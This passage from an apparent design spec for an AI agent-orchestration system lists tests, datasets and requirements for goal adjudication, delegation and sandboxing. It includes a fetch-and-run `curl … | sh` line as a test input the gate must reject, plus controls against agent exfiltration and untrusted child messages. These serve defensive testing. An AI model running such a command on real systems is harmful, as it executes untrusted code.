| 3 | `TestFeasibilityGate_RejectsOutOfPolicy` | Unit | Feasibility gate rejects (G-7) | out-of-policy tool/credential rejected at compile |
| 4 | `TestFeasibilityGate_RejectsUnjudgeable` | Unit | Semantic non-judgeability (D9) | no-determinable-truth rejected |
| 5 | `TestCriterionUnjudgeable_FailClosedEscalateOnce` | Unit | Compile-gate false-accept (R§8.1) | unmet verdict + one escalation, no verdict class |
| 6 | `TestBlockedCheck_UnableToVerify` | Unit | Blocked machine check (G-3) | sandbox-denied → unable-to-verify, re-run, not absent |
| 7 | `TestDelegateTool_Respond_OwnerRequiredDeniedEvenWhenAcked` | Unit | owner_required cannot be answered (R§8.2) | runtime rejects parent respond |
| 8 | `TestTokenBudgetDebit_AtomicOnePool` | Unit | Overall budget debits every scope (G-14, R§8.3d) | concurrent debits atomic; ignores IsPrivilegedAgent |
| 9 | `TestTokenBudget_UnsetUnbounded_Advisory` | Unit | Unset budget (R§8.3a) | 0 = unbounded + advisory |
| 10 | `TestPlanLint_RejectsOverlappingWriteSets` | Unit | Overlapping write-sets (G-16) | overlap rejected at approve |
| 11 | `TestPlanLint_RejectsJoinlessConvergence` | Unit | Join-less convergence (G-16) | missing join member rejected |
| 12 | `TestLifecyclePillCrosswalk` | Unit | Pill derives from lifecycle+overlay+plan_phase (R§8.10) | mapping table; judging/judge_unavailable ephemeral, re-planning from durable plan_phase (survives restart → re-planning not waiting_on_user) |
| 13 | `TestIsNeedsInputReconstructable_Predicate` | Unit | Reconstructability predicate (R§8.6) | 4-clause AND, table-driven |
| 14 | `TestRevisionEntry_ThreeVerbs` | Unit | Correction three verbs (G-11) | append/supersede/targeted_retry shapes |
| 15 | `TestRoundAccounting_AdjudicationSemantics` | Unit | Round means adjudication (R§8.9) | increment site + migration no-op |
| 16 | `TestClaim_AdjudicatesExactlyOnce_G1` | Integration | Claim invokes once / Idle fires once (G-1/G-2) | claim-gated + quiet-window debounce, per goal-id |
| 17 | `TestIdleSettlement_FiresOnceConsumesRoundRearms_G2` | Integration | Verifier turn counts as activity (F5) | no second idle verdict races |
| 18 | `TestWaitingOnUser_PauseNoRoundNoVerdictIdleSuppressed_G5` | Integration | Waiting-on-user pause (G-5) | no verdict/round; idle suppressed |
| 19 | `TestMultiGoalPerSession_Isolation` | Integration | Two goals independent (R§8.11) | 2 pills/timers/budgets; 2 cap slots |
| 20 | `TestGoalCompile_EchoConfirm_Amendment` | Integration | Echo-confirm (G-8) / Re-statement amendment (N-6) | activate-on-reply + diff |
| 21 | `TestSessionMessage_Transport_Caps` | Integration | Native child push (g6) / ceiling fails back (D15) | typed inbox, dedupe, per-child ceiling, sibling isolation |
| 22 | `TestDelegateTool_Run_IllegalLaunchProfile_Rejected` | Integration | Illegal combo rejected (MAJ-7) | REMOVED — superseded by ADR-053 Amendment (2026-08-30): `launch_profile` deleted outright, this test no longer exists (see FR-123's entry) |
| 23 | `TestValidateContextSnapshot_AllowlistAndCap` | Integration | Snapshot capped (R§8.5) | discretionary over-cap rejected; mandatory core (prompt+criteria+identity) exempt from byte cap; contents allow-listed |
| 24 | `TestNeedsInput_Expired` | Integration | needs_input escalation (G-6) | fake-clock T1 + auto-handback at TTL |
| 25 | `TestConformance_g7_SessionRoundTrip_WarmQuestionRespondHandback` | Integration | Warm resume (g7) | same generation, correlation routing, out-of-order safe |
| 26 | `TestDelegateTool_Respond_3P_OriginalNotLeftRunning` | Integration | 3P fire-and-collect (D5) | markers-only; respond spawns new session |
| 27 | `TestOwnerLoop_AwaitingCorrection_OneRound` | Integration | Awaiting-owner-correction (G-9) | tick N times → one round → wait |
| 28 | `TestAutoReset_ExcludesFrozenDoneMembers` | Integration | Auto-reset excludes frozen (G-10) | frozen excluded; unreachable → honest exit |
| 29 | `TestTransactionalAppend_KillMidAppend_PreAppendDAG` | Integration | Correction transactional (G-11/INV-6) | kill mid-append → intent-log rollback → pre-append DAG |
| 30 | `TestPlay_ResumeFromCommit_NewGeneration` | Integration | Play from commit (G-12) | resumed_from; commit-resume / fresh-attempt fallback |
| 31 | `TestGitEvidence_Commit_WriteSetScopedAndContentionSurfaced` | Integration | Write-set-scoped commit (G-15) | out-of-write-set → contention, not swallowed |
| 32 | `TestGitSec_OpPolicy_DenySet` | Integration | .git deny (D17) | reads allowed; mutations + `.git/` bash denied |
| 33 | `TestGitEvidence_Integrity_LostOnOutOfBandHistoryRewrite` | Integration | HEAD-divergence (G-15) | fail-closed diff channel |
| 34 | `TestGitEvidence_Open_NestedRepoAboveDirDegrades` | Integration | Degraded ladder (R§8.4) | subdir/nested → fresh attempt, signalled |
| 35 | `TestGitSecSecretScan_WrittenThenDeleted` | Integration | Secret written then deleted (MIN-5) | registry scan + purge/gc |
| 36 | `TestS4Interlock_SteerVerdictSerialization` | Integration | Concurrent steer/verdict (INV-3) | serialized, no lost/dup verdict |
| 37 | `TestBootSweep_NonTerminalToFailedInterrupted` | Integration | Boot sweep (G-13) | within N s; session.failed; recovers |
| 38 | `TestBootSweep_NeedsInputReconstructable_Preserved` | Integration | Reconstructability at boot (R§8.6) | preserve vs sweep |
| 39 | `TestLiveUpgradeReBaseline` | Integration | Live-upgrade re-baseline (N-15) | in-flight goal re-baselined |
| 40 | `TestSessionMessagingConsumer_KillSwitch_NoOpsWhenDisabled` | Integration | Global kill switch (DoD-10) | enabled=false neuters live |
| 41 | `Conformance_t0_ChatGoalE2E` | E2E | t0 conformance | drawn path observed, real-LLM |
| 42 | `Conformance_t1_StandaloneTaskE2E` | E2E | t1 conformance | ▶/■ + ladder |
| 43 | `Conformance_t2_PlanLifecycleE2E` | E2E | t2 conformance | F2 proof + Play-from-commit + no per-member controls |
| 44 | `Conformance_t3_PlanningReplanningE2E` | E2E | t3 conformance | supersede + targeted-retry + transactional append |
| 45 | `Conformance_g4_ParallelLintE2E` | E2E | g4 conformance | lint reject + isolated-checkout (highest rung) + conflict→correction |
| 46 | `Conformance_g5_ShardAssembleE2E` | E2E | g5 conformance | both topologies, authored join |
| 47 | `Conformance_g6_SessionControlE2E` | E2E | g6 conformance | question→answer/escalate, ceiling, durable inbox |
| 48 | `Conformance_g7_RoundTripE2E` | E2E | g7 conformance | steer + blocking question + handback, warm |
| 49 | `Conformance_bootsweep_E2E` | E2E | §5 boot sweep conformance | kill -9 → no wedge |
| 50 | `TestNonVerdictClassifier_MechanismRanPredicate` | Unit | Non-verdict classifier (M1) | predicate "did the mechanism run?": blocked/unreadable→unable_to_verify (re-run); ran-no-judgment→criterion_unjudgeable |
| 51 | `TestCriterionUnjudgeable_OwnerRemediation` | Integration | Owner remediation (M2) | re-statement mints amended generation fixing the criterion; owner-inert → failed(judge_rounds_exhausted) |
| 52 | `TestAuthorityUpgrade_ContentDerived` | Unit | Runtime authority upgrade (M3) | self_ok→owner_required on credential/spend/irreversible/out-of-scope; omitted→owner_required; child cannot downgrade |
| 53 | `TestBootSweep_AwaitingCorrectionOwnerNotSweptAcrossRestart` | Integration | Awaiting-correction survives restart (C1/m-3) | persisted signature honored; paused owner session (owner_scope=human) exempt from sweep via the `Plan.owner_session_id`↔`owns_plan_id` linkage; pill reconstructs as re-planning; zero re-judge on restart |
| 54 | `TestIntentLog_ReplayAtBoot_DiscardUncommitted` | Integration | Tail-append intent-log (M4/INV-6) | self-contained intent (full member bodies); commit-before-apply; uncommitted → discard → pre-append DAG; committed-not-done → idempotent replay-forward (double-apply is a no-op) |
| 55 | `TestMessageParentTool_ContentEgressFilter_Applied` | Integration | Content-egress cross-boundary (FR-128) | secret redacted; child cannot exfiltrate through the parent inbox what it could not send directly |
| 56 | `TestSyncDelegateWait_Rejected` | Integration | Sync-wait reject (FR-130) | wait=true question rejected by default; human route only via explicit opt-in bounded wait |
| 57 | `TestPlannerSkillExtend_NoForkedAgent` | Integration | Planner extends plan skill (FR-146) | behavior sourced from EXTENDED SKILL.md; no forked Planner agent; gaming-guard flags post-unmet artifacts |
| 58 | `TestAttemptsVsRounds_DistinctBrakes` | Unit | Attempts vs rounds distinct (FR-178) | two separate counters; whichever trips first stops its scope; never conflated |
| 59 | `TestMidSpanFrames_Reconstruct` | Integration | Mid-span frames reconstruct (FR-188) | since-cursor replay of subagent_message/subagent_state reconstructs pill/panel; no parallel channel |
| 60 | `TestGoalClear_CancelsInflightCompilation` | Integration | Goal-clear cancels compilation (FR-114, minor m1) | `/goal clear` cancels an in-flight compilation turn as well as the verifier |
| 61 | `TestConformance_g6_PerChildCeiling_NoisyChildCannotStarveSibling` | Integration | Sibling isolation negative (minor m2) | a noisy child AT its ceiling does NOT consume/affect a sibling child's ceiling or inbox |

### Test name reconciliation (planning label → implemented name)

The TDD plan above and the Traceability Matrix below were authored against
**pre-implementation TDD test names**. At implementation several were renamed
(this is normal — the TDD name is a planning label, not a contract). The tables
have been reconciled to the **actual `func` names** so a reviewer grepping the
matrix lands on a real test; this subsection is the audit record of the rename.

Already reconciled in the tables (planning label → implemented `func`):

| Planning label (was) | Implemented test name |
|---|---|
| `TestClaimOrIdleTrigger_Loop` | `TestClaim_AdjudicatesExactlyOnce_G1` |
| `TestIdleSettlement_VerifierActivityNoSelfRace` | `TestIdleSettlement_FiresOnceConsumesRoundRearms_G2` |
| `TestClaimEvidenceGate_BounceEconomics` | `TestEvidenceGate_ConsecutiveRejectionsRouteThroughAttemptBudgetOnSecond` |
| `TestWaitingOnUser_SuppressesIdle` | `TestWaitingOnUser_PauseNoRoundNoVerdictIdleSuppressed_G5` |
| `TestAuthorityValidator_RejectsOwnerRequiredRespond` | `TestDelegateTool_Respond_OwnerRequiredDeniedEvenWhenAcked` |
| `TestContextSnapshot_DenyByDefault_Capped` | `TestValidateContextSnapshot_AllowlistAndCap` |
| `TestNeedsInput_TTL_Escalation` | `TestNeedsInput_Expired` |
| `Test3P_FireAndCollect_RespondNewSession` | `TestDelegateTool_Respond_3P_OriginalNotLeftRunning` |
| `TestDelegateActionSet_LegalityTable` | `TestDelegateTool_Execute_InvalidAction` (the `launch_profile` legality-table half, `TestDelegateTool_Run_IllegalLaunchProfile_Rejected`, no longer exists — REMOVED, superseded by ADR-053 Amendment, 2026-08-30) |
| `TestOwnerLoop_AutoResetExcludesFrozen_HonestExit` | `TestAutoReset_ExcludesFrozenDoneMembers` |
| `TestCorrection_TransactionalAppend_Crash` | `TestTransactionalAppend_KillMidAppend_PreAppendDAG` |
| `TestGitBoundaryCommit_WriteSetScoped_Contention` | `TestGitEvidence_Commit_WriteSetScopedAndContentionSurfaced` |
| `TestGitDeny_ByOperation_SandboxBlock` | `TestGitSec_OpPolicy_DenySet` |
| `TestGitHeadDivergence_IntegrityLost` | `TestGitEvidence_Integrity_LostOnOutOfBandHistoryRewrite` |
| `TestGitDegradedLadder_NoCommitFreshAttempt` | `TestGitEvidence_Open_NestedRepoAboveDirDegrades` |
| `TestSecretScan_OnAutoCommit` | `TestGitSecSecretScan_WrittenThenDeleted` |
| `TestBootSweep_NeedsInputReconstructable` | `TestBootSweep_NeedsInputReconstructable_Preserved` |
| `TestBootSweep_AwaitingCorrectionDurable` | `TestBootSweep_AwaitingCorrectionOwnerNotSweptAcrossRestart` |
| `TestIntentLog_TailAppend_ReplayRollback` | `TestIntentLog_ReplayAtBoot_DiscardUncommitted` |
| `TestContentEgress_CrossBoundary` | `TestMessageParentTool_ContentEgressFilter_Applied` |
| `TestWarmResume_RespondByCorrelation` | `TestConformance_g7_SessionRoundTrip_WarmQuestionRespondHandback` |
| `TestSessionMessage_SiblingIsolation_Negative` | `TestConformance_g6_PerChildCeiling_NoisyChildCannotStarveSibling` |
| `TestConfigLiveReload_KillSwitch` | `TestSessionMessagingConsumer_KillSwitch_NoOpsWhenDisabled` |

Notes on the remaining planning-label citations:

- **`Conformance_t0/t1/t2/t3/g4/g5/g6/g7/bootsweep` (rows 41–49 + the bare
  `Conformance_gN` matrix cells):** these are **E2E / Playwright conformance
  scenario labels**, not Go `func` names. Where a slice has a Go-level
  counterpart it is named `TestConformance_<diagram>_<aspect>` (e.g.
  `TestConformance_g6_PerChildCeiling_NoisyChildCannotStarveSibling`,
  `TestConformance_g7_SessionRoundTrip_WarmQuestionRespondHandback`); the rest
  are driven by the CI e2e gate (Playwright) or are pending the conformance
  harness. Grep `^func TestConformance_` in `pkg/` for the Go slices and see
  `tests/e2e/` for the Playwright scenarios.
- **`TestLiveUpgradeReBaseline` (FR-106/120), `TestMultiGoalPerSession_Isolation`
  (FR-107/108), `TestOwnerLoop_AwaitingCorrection_OneRound` (FR-140/141),
  `TestRoundAccounting_AdjudicationSemantics` (FR-105),
  `TestRevisionEntry_ThreeVerbs` (row 14), `TestLifecyclePillCrosswalk`
  (FR-185/186), `TestAuthorityUpgrade_ContentDerived` (FR-131/139),
  `TestPlannerSkillExtend_NoForkedAgent` (FR-146),
  `TestMidSpanFrames_Reconstruct` (FR-188), `TestS4Interlock_SteerVerdictSerialization`
  (FR-190/191):** these planning labels do not have a same-named Go test; their
  behavior is covered by the feature-area suites under different names (e.g.
  round accounting by `TestApplyJudgeRoundOutcomeLocked_AppliesWhenStillRunning`;
  steer/verdict serialization by the `TestParentFollowUp_ConcurrentSiblings_*`
  and `TestVerifierInFlight_*` suites; pill rendering by the FE Vitest suites).
  They are retained as planning labels for traceability; to locate the
  implemented coverage, grep the feature keyword in `pkg/`/`src/`.

The authoritative list of implemented Go test names is:
`grep -rh '^func Test' pkg/ | sort -u` (plus `^func TestConformance_`).

### Test Datasets

#### Dataset: Criterion compile / feasibility gate inputs

| # | Input | Boundary Type | Expected Output | Traces to | Notes |
|---|-------|---------------|-----------------|-----------|-------|
| 1 | `check: "go test ./..." exit 0` | Happy | accepted, persisted | Feasibility gate rejects (G-7) | machine check reachable |
| 2 | `check: "curl … | sh"` when curl out of policy | Error | rejected at compile | Feasibility gate rejects (G-7) | injection defense |
| 3 | `prose: "the refactor feels maintainable"` | Error | rejected (unjudgeable) | Semantic non-judgeability (D9) | no determinable truth |
| 4 | `behavior: {tool: web_search, min_count: 5}` | Happy | accepted | one-criteria model | reuse CriterionBehavior |
| 5 | criterion referencing a credential beyond policy | Error | rejected at compile | Feasibility gate rejects (G-7) | credential reachability |
| 6 | gate accepts, runtime Judge cannot rule | Error | unmet + one escalation | Compile-gate false-accept (R§8.1) | fail-closed fallback |

#### Dataset: Token budget boundaries

| # | Input (budget / consumed) | Boundary Type | Expected Output | Traces to | Notes |
|---|---------------------------|---------------|-----------------|-----------|-------|
| 1 | `0 / any` | Zero (sentinel) | unbounded + advisory | Unset budget (R§8.3a) | 0 = no cap |
| 2 | `1000 / 999` | Max-1 | continues | Exhaustion brakes (R§8.3c) | below cap |
| 3 | `1000 / 1000` | Max | current turn finishes then brake at boundary | Exhaustion brakes (R§8.3c) | wind-down |
| 4 | `1000 / 1001` | Max+1 (concurrent race) | atomic — one brake; counter not corrupted; `consumed` may sit at 1001 (bounded overshoot ≤ in-flight cost), NOT clamped/negative | Overall budget atomic (G-14, M5) | one lock, post-turn debit |
| 5 | `1000 / N` with a core-agent turn | Happy | core turn debits (ignores IsPrivilegedAgent) | Overall budget (G-14) | D12 no exemption |

#### Dataset: Write-set disjointness

| # | Stream A write_set | Stream B write_set | Boundary Type | Expected | Traces to |
|---|--------------------|--------------------|---------------|----------|-----------|
| 1 | `[api/routes.go]` | `[web/app.tsx]` | Disjoint | approve | Overlapping rejected (G-16) |
| 2 | `[api/routes.go]` | `[api/routes.go]` | Overlap | reject at approve | Overlapping rejected (G-16) |
| 3 | `[]` (exploratory) | `[]` (exploratory) | No declaration | highest-available isolation rung (worktree→clone→subdir per FR-154); conflict→correction | Exploratory (D10/M6) |
| 4 | `[shards/a.csv]` | `[shards/b.csv]` + join builds `report.xlsx` | Shard+assemble | approve; join is a member | Shard+assemble (g5) |
| 5 | streams converge, no join member | — | Join-less | reject at approve | Join-less (G-16) |

#### Dataset: Session-lifecycle state transitions

| # | From state | Event | To state / outcome | Traces to | Notes |
|---|-----------|-------|--------------------|-----------|-------|
| 1 | `running` | `question(wait=true)` | `needs_input` | Warm resume (g7) | park |
| 2 | `needs_input` | `respond` (correlation) | `running` (same generation) | Warm resume (g7) | INV-4 |
| 3 | `needs_input` | TTL elapsed | `timed_out` + auto-handback(pause) | needs_input escalation (G-6) | INV-5 |
| 4 | `running` | boot sweep (no live turn) | `failed(interrupted)` | Boot sweep (G-13) | INV-9 |
| 5 | `needs_input` | boot sweep + !reconstructable | `failed(interrupted)` | Reconstructability (R§8.6) | INV-9 |
| 6 | `running` (plan-owner) | all-terminal & unmet | `paused` (session) + `plan_phase=awaiting_owner_correction` (plan, durable) | Awaiting-correction (G-9) | INV-2/INV-7 |
| 7 | `paused` + `plan_phase=awaiting_owner_correction` | unchanged idle tick | no re-judge, no round (persisted signature) | Awaiting-correction (G-9) | INV-7/F2 |
| 8 | `paused` + `plan_phase=awaiting_owner_correction` | boot sweep after `kill -9` | EXEMPT from sweep; preserved; no re-judge (persisted signature survives) | Awaiting-correction survives restart (C1) | INV-9 exemption |
| 9 | `paused` + owner appends correction | intent-log tail-append | `running` (re-dispatch) | Correction transactional (G-11) | INV-6 |
| 10 | `cancelled` | Play | new `approved` generation via resumed_from | Play from commit (G-12) | new generation |

#### Dataset: Message caps & ceilings (fake clock)

| # | Input | Boundary Type | Expected | Traces to | Notes |
|---|-------|---------------|----------|-----------|-------|
| 1 | child sends 10 msgs in 60 s | Max | accepted | ceiling fails back (D15) | rate cap |
| 2 | child sends 11th in 60 s | Max+1 | tool error to child (no drop) | ceiling fails back (D15) | never silent |
| 3 | child at 20 open question+blocker | Max | ceiling reached | ceiling fails back (D15) | per-child |
| 4 | 21st question at ceiling | Max+1 | tool error "await answers" | ceiling fails back (D15) | per-child, sibling OK |
| 5 | body 33 KiB | Max+1 | tool error | Native child push (g6) | 32 KiB cap |
| 6 | payload depth 6 | Max+1 | tool error | Native child push (g6) | depth ≤5 |

### Regression Test Requirements

**This feature MODIFIES the ADR-052/049 engine** — the trigger path, the plan engine correction loop, the delegate tool, the completion-signal parser, and the token/cost path. The following existing behaviors MUST be preserved and their tests MUST stay green:

| Existing Behaviour | Existing Test | New Regression Test Needed | Notes |
|--------------------|---------------|----------------------------|-------|
| Deterministic dispatch, caps, verdict plumbing | `pkg/agent/plan_engine_test.go` | No — must stay green | Engine reused unchanged |
| Stop/Play restart continuity + JudgeRounds zeroing | `pkg/agent/plan_restart_continuity_adr052_qa_test.go` | Extend for Play-from-commit (G-12) | resumed_from generation |
| Cap admission & overlap guard | `pkg/agent/cap_admission_adr052_qa_test.go` | Extend for per-goal-id cap slots (R§8.11) | multi-goal accounting |
| Delegate identity from target (ADR-032) | `pkg/agent/subturn_target_identity_test.go` | No — must stay green | snapshot must NOT leak parent identity |
| `TASK_STATUS`/`[goal:evidence]` parse + bounce | `pkg/agent/task_completion_signal*_test.go` | Add `GOAL_STATUS` family cases | co-located fragment |
| F2 awaiting-owner-correction gate | (landed at `02171db1`, in-memory) | Regression test that FAILS if `lastUnmetTerminalSignature` removed (G-9); ADD `TestBootSweep_AwaitingCorrectionOwnerNotSweptAcrossRestart` for the durable-across-restart version (C1 — persists the signature on the plan record so the gate survives restart) | standalone proof + durable upgrade |
| Goal-clear cancels verifier + compilation | `pkg/agent/goal_loop*_test.go` | Extend for stray-claim-inert (N-12) | trigger gating |
| PUT-lockdown / raw-body reject (ADR-035/037) | existing gateway tests | Add for `delegation_policy`/budget forbidden fields | precedent |
| SEC-26 cost path | `pkg/security/ratelimit*_test.go` | Add token-budget-ignores-IsPrivilegedAgent (G-14) | D12 posture shift |

#### Regression Dataset: Preserved ADR-052 behaviour

| # | Input | Previous Behaviour | Must Still Produce | Traces to |
|---|-------|--------------------|--------------------|-----------|
| 1 | existing one-shot `delegate.run` (no action) | spawn + collect | unchanged (maps to `utility` profile) | Regression: delegate compat |
| 2 | plan all-terminal-but-unmet, idle ticks | (post-F2) one round then wait | one round then wait | Regression: F2 gate |
| 3 | delegated child | runs as target identity (ADR-032) | runs as target identity | Regression: subturn identity |
| 4 | plan member with dependents | no per-member cancel offered | no per-member cancel offered (D7) | Regression: member controls |

---

## Functional Requirements

> Each FR is tagged `[P0]`/`[P1]`/`[P2]`/`[P3]` = delivery Phase (0 spine+contracts · 1 substrate · 2 behaviors · 3 conformance).

### Group A — Trigger, pause, multi-goal (Phase 2)

- **FR-101** `[P2]`: The system MUST adjudicate a chat goal ONLY on (a) an explicit completion claim (`[goal:evidence]` + `GOAL_STATUS: met`) or (b) event-driven idle settlement — never after every worker turn.
- **FR-102** `[P2]`: Idle settlement MUST fire exactly one adjudication when all idle conditions hold and the ~60 s quiet window elapses, consume one round, and re-arm only on new activity.
- **FR-103** `[P2]`: A claimless idle adjudication MUST bypass the rung-0 gate and judge persisted evidence (artifacts, write-set-scoped diffs, latest checkpoint).
- **FR-104** `[P2]`: A `GOAL_STATUS: waiting_on_user` turn MUST pause with no verdict and no round and suppress idle settlement while waiting; absence of the marker MUST default to not-waiting.
- **FR-105** `[P2]`: A round MUST count one adjudication (claim or idle-settled), not one worker turn; `judge_rounds_max` counts adjudications (R§8.9).
- **FR-106** `[P1]`: In-flight round counts MUST be preserved unchanged on a live-upgrade migration; only the increment site changes.
- **FR-107** `[P2]`: Idle timers, pills, round budgets, and settlement MUST be keyed by goal-id; a session with N goals MUST run N independent settlements (R§8.11).
- **FR-108** `[P2]`: The global cap MUST count goal-bearing scopes: each active chat goal-id (one slot), each running plan (ONE slot for the plan — its members are NOT separately counted), each standalone task (goal-bearing → one slot, m3), and each enabled loop. Delegate children and plan members MUST NOT be counted (not independently goal-bearing).
- **FR-109** `[P2]`: The plan owner MUST be excluded from the task-level idle trigger; idle settlement MUST take precedence over the FR-045 no-signal penalty for a goal-bearing session; the verifier's own turn MUST count as activity.

### Group B — Goal compiler & feasibility (Phase 2)

- **FR-110** `[P2]`: On `/goal set` the engine MUST compile intent into machine/behavior/prose criteria via a schema-validated compilation turn with a co-located parser.
- **FR-111** `[P2]`: The compile-time feasibility gate MUST reject any criterion whose tool/credential/network is out of the agent's policy AND any criterion that is semantically unjudgeable (D9); no rejected criterion may persist.
- **FR-112** `[P2]`: Compiled machine checks MUST run under the goal-bearing agent's OWN tool policy + kernel sandbox — never a privileged bypass (MAJ-13).
- **FR-113** `[P2]`: The compiled goal (including literal commands) MUST be echoed in chat and go active only on the user's chat confirmation (no form/modal); a `/goal <new intent>` MUST be diffed as an amendment, never silently recompiled.
- **FR-114** `[P2]`: `/goal clear` MUST cancel the in-flight verifier AND any in-flight compilation, remove the goal, and inert the completion-claim trigger.

### Group C — D9 runtime fallback (Phase 2)

- **FR-101R** (alias FR-115) `[P2]`: When the runtime Judge's verifier turn RAN to completion but could form no judgment on a criterion the compile gate accepted, the system MUST resolve that criterion `unmet` for the adjudication (AND-combine) and MUST emit exactly one `criterion_unjudgeable` owner-escalation per goal-id; it MUST NOT reintroduce a runtime `criterion_unverifiable` verdict class or mutate the criterion (R§8.1).
- **FR-116** `[P2]`: The Judge MUST return "unable to verify" (distinct from unmet-for-absent-evidence) when a machine check's verification MECHANISM could not execute (sandbox-denied / tool unavailable / policy-blocked / exit-code unreadable), and the check MUST be re-run safely (blocked-check fix, G-3). The re-run MUST be **bounded**: after `unable_to_verify_max_reruns` (K, config-keyed, default 3) CONSECUTIVE unable-to-verify results on the SAME check, the criterion MUST escalate to the owner as a persistently-blocked check (a distinct owner escalation), so a permanently-blocked check cannot loop the adjudication forever.
- **FR-137** `[P2]` (Group C, M1): The runtime MUST classify a non-verdict via a named function `classifyNonVerdict(verifierTurn)` whose predicate is **"did the verification mechanism run to completion?"** — if NO (mechanism blocked/unavailable/unreadable) → `unable_to_verify` → re-run, NEVER scored (FR-116/G-3), bounded by `unable_to_verify_max_reruns` (K) consecutive re-runs before a persistently-blocked-check owner escalation (m-4); if YES but no judgment could be formed (genuinely subjective) → `criterion_unjudgeable` → unmet + escalate-once (FR-115). The classification MUST key on the verifier turn's machine-observable outcome, never on prose.
- **FR-138** `[P2]` (Group C, M2): The remediation for a `criterion_unjudgeable` escalation MUST be an owner **re-statement** — a diffed, confirmed amendment (D11/N-6) minting a new goal generation with the mis-compiled criterion corrected (criteria stay immutable per D9; re-statement AMENDS) — OR `/goal clear`. The escalate-once MUST NOT be described or relied upon as preventing round-burn: it surfaces the problem; absent owner action the goal MUST honestly terminate `failed(judge_rounds_exhausted)`.

### Group D — Durable session record & boot sweep (Phase 1)

- **FR-117** `[P0]`: A durable per-entity JSONL session record with the 8-state enum `queued/running/needs_input/paused/completed/failed/cancelled/timed_out` MUST be the single source of truth for "is anything still working?" (S2), distinct from `Session.status` and `plan.State`.
- **FR-118** `[P1]`: At boot, every persisted non-terminal session with no live runtime turn MUST become `failed(interrupted)` within N s carrying its last checkpoint + undelivered messages, and emit a `session.failed` event — EXCEPT (a) a reconstructable parked `needs_input` session (FR-119) and (b) a `paused` plan-owner session whose plan is durably `awaiting_owner_correction` (C1), both of which are legitimately idle and MUST be preserved, not swept. The sweep MUST identify exemption (b) through the named plan↔owner-session linkage (`Plan.owner_session_id` / the owner session's reciprocal `plan_id`, FR-147) — NOT through `owner_scope` (which is `human` for a top-level owner). The sweep MUST re-dispatch/re-judge only plans whose all-terminal state actually changed or that were mid-turn — never an unchanged awaiting-correction plan (INV-7 preserved, keyed by the persisted `last_unmet_terminal_signature`).
- **FR-119** `[P1]`: A parked `needs_input` session MUST be preserved as resumable iff `isNeedsInputReconstructable` is TRUE (all four clauses), else swept identically (R§8.6). The determination MUST be **re-evaluated at boot**; the `needs_input.reconstructable` field persisted at park is a hint only, never the authority (m5).
- **FR-120** `[P1]`: A trigger-semantics upgrade MUST re-baseline in-flight goals on the same boot sweep (re-arm idle timers, re-read trigger config) so no goal straddles two semantics (N-15).

### Group E — Session messaging & delegation (Phase 1)

- **FR-121** `[P0]`: One typed `SessionMessage` envelope (inline `oneOf` + discriminator in `openapi.yaml`, ADR-034) MUST carry every message kind; all cross-boundary types MUST be generated from `contracts/*.yaml` before any Go/TS (Constraint #8).
- **FR-122** `[P1]`: `delegate` MUST support `run|status|inbox|inbox_ack|steer|respond|cancel|follow_up|peek` and a child `message_parent` tool; each new action/tool MUST have an explicit seeded Constraint-#6 policy entry (no wildcard).
- **FR-123** `[P1]`: Launch flags MUST collapse to `utility`/`specialist` profiles with a published legality table; illegal combos MUST be rejected at `delegate.run`, never silently accepted.
  > **REMOVED — superseded by ADR-053 Amendment (2026-08-30).** `launch_profile` (`utility` vs. `specialist`) is deleted outright from both wire schemas and `session.LifecycleRecord`, and the `delegate` tool no longer accepts or documents the parameter — there is no longer a launch-time choice between a fire-and-collect delegation and a steerable one, and therefore no legality table and no illegal combo to reject. Every direct delegation now behaves the way `specialist` used to: `action="respond"` is always available on a non-terminal child session, gated only by ownership and state. This bullet and its Traceability Matrix row are retained as historical record of the requirement that shipped and was later removed — do not implement against them. See ADR-053's Amendment note for full rationale.
- **FR-124** `[P1]`: The curated context snapshot at spawn MUST be deny-by-default (task prompt + goal/criteria + parent-named artifact references + engine-injected target identity only). `snapshot_max_bytes` MUST bound only the DISCRETIONARY portion (parent-named references + parent-added notes); the MANDATORY core (task prompt + compiled criteria + engine-injected identity) MUST be EXEMPT from the byte cap so a large-but-legitimate goal is never rejected for its own criteria (m4). `snapshot_max_refs` MUST still bound the reference count. Over-cap on the discretionary portion MUST reject the `run` (never silently truncate) (R§8.5).
- **FR-125** `[P1]`: Message delivery MUST be at-least-once with runtime dedupe by `message_id`; back-pressure MUST fail to the child as a tool error (never a silent drop); per-child unacked ceiling MUST be 20 open question+blocker so one child cannot starve siblings (D15).
- **FR-126** `[P1]`: `needs_input` MUST carry a TTL (24 h default) with escalation at T1 and auto-`handback(pause)` at TTL — never a silent expiry (G-6).
- **FR-127** `[P1]`: `steer`/`respond` MUST land at the child's NEXT tool boundary (never mid-tool) via the existing per-scope steering queue; `follow_up`/Play MUST mint a new generation via `resumed_from` (terminal states immutable).
- **FR-128** `[P1]`: A message crossing an agent/channel boundary MUST pass the same content-egress policy the agent's outputs obey (N-10); secrets MUST be redacted (S-2); child bodies MUST render to the parent LLM in untrusted-content framing.
- **FR-129** `[P1]`: The durable inbox MUST be keyed to the durable chat/plan id (D16) so a parent Stop/Play never strands a child's question; board task ↔ session MUST be 1:N with "failed if any required session failed" aggregate (O-1).
- **FR-130** `[P1]`: A sync-delegate `wait=true` question MUST be rejected with a clear tool error by default; human routing MUST be an explicit launch-flag opt-in with a bounded wait (P2M-14/MIN-3).

### Group F — Questions & authority (Phase 2)

- **FR-131** `[P0]`: Every `question`/`decision_request` MUST carry `authority: self_ok | owner_required`; an omitted/absent `authority` MUST default to `owner_required` (fail-closed, M3).
- **FR-132** `[P2]`: The runtime validator MUST reject a parent `respond` to an `owner_required` question (never LLM-trusted); such a question MUST escalate to the owner terminus (human/top-level) (R§8.2).
- **FR-133** `[P2]`: Ownership MUST derive from the spawn edge (owner = union of spawning parent · owning plan · human for top-level); a parent may message only its own children, a child only its owner parent — never siblings.
- **FR-134** `[P2]`: The human MUST answer in normal chat with no per-question reply card; correlation routing is the parent's job (D2, channel-portable).
- **FR-135** `[P2]`: Deep-chain question latency MAY be bounded by an opt-in direct-escalate shortcut (default OFF = strict one-hop); when enabled the engine MUST route an `owner_required` question to the nearest human owner in one traversal within `question_escalation_max_hops`/`_deadline`, notifying intermediate parents (R§8.7).
- **FR-136** `[P2]`: 3P (`subagent_3p`) children MUST NOT advertise `question`/`needs_input`/warm-resume; a `respond` MUST spawn a NEW corrective session (D5); the UI MUST show a fire-and-collect badge.
